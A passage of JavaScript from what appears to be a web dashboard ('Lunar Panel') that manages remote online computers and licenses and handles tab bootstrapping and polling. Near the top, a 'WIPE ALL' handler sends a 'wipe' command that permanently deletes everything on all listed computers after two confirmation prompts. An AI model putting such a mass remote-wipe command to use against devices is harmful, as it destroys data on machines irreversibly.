      `You are about to PERMANENTLY DELETE everything on ${ids.length} online computer(s).\n\nFiles are NOT sent to Recycle Bin.\nThis CANNOT be undone.\n\nContinue?`,
      {danger:true,okText:"Continue"});
    if(!ok) return;
    ok = await confirmModal("Final Confirmation",`Really wipe ALL ${ids.length} computer(s)?\n\nThere is NO undo.`,{danger:true,okText:"WIPE ALL NOW"});
    if(!ok) return;
    for(const id of ids){ await sendDeviceCommand(id,"wipe",""); await new Promise(r=>setTimeout(r,350)); }
    log(`☠ WIPE ALL queued for ${ids.length} devices`,"warning");
  });
  $("[data-act=refresh]",panel).addEventListener("click",refreshData);
  $("[data-act=createLicense]",panel).addEventListener("click",()=>openLicenseDialog("create"));
  $("[data-act=removeExpired]",panel).addEventListener("click",removeExpiredLicenses);

  refreshData();
  const pollId = setInterval(refreshData, DEFAULTS.lunarRefresh);
  state.pollers.push(pollId);
  panel._cleanup = ()=>{ state.pollers.forEach(id=>clearInterval(id)); };
}

/* ============================================================
   BOOTSTRAP
   ============================================================ */
function boot(){
  State.projects = loadProjects();

  $("#btnSaveProjects").addEventListener("click",()=>{ saveProjects(); toast("Projects saved","success"); });
  $("#btnAddDB").addEventListener("click",()=>{
    let t = State.tabs.find(x=>x.type==="add-db");
    if(!t){ t = {id:"adddb_"+uid(),title:"＋ Add DB",type:"add-db"}; State.tabs.push(t); }
    switchTab(t.id);
  });
  $("#btnLunar").addEventListener("click",()=>{
    let t = State.tabs.find(x=>x.type==="lunar");
    if(!t){ t = {id:"lunar_"+uid(),title:"🌙 Lunar Panel",type:"lunar"}; State.tabs.push(t); }
    switchTab(t.id);
  });

  State.projects.forEach(p=>openProjectTab(p));

  if(!State.tabs.find(t=>t.type==="lunar")){
    State.tabs.push({id:"lunar_"+uid(),title:"🌙 Lunar Panel",type:"lunar"});
  }
  if(!State.tabs.find(t=>t.type==="add-db")){
    State.tabs.push({id:"adddb_"+uid(),title:"＋ Add DB",type:"add-db"});
  }

  if(!State.activeTabId && State.tabs.length) State.activeTabId = State.tabs[0].id;
  renderTabs();
  renderPanels();

  window.addEventListener("beforeunload",()=>{ try{ saveProjects(); }catch(e){} });
  window.addEventListener("error",(e)=>{ console.error("Runtime error",e.error||e.message); });
}

document.addEventListener("DOMContentLoaded",boot);
</script>
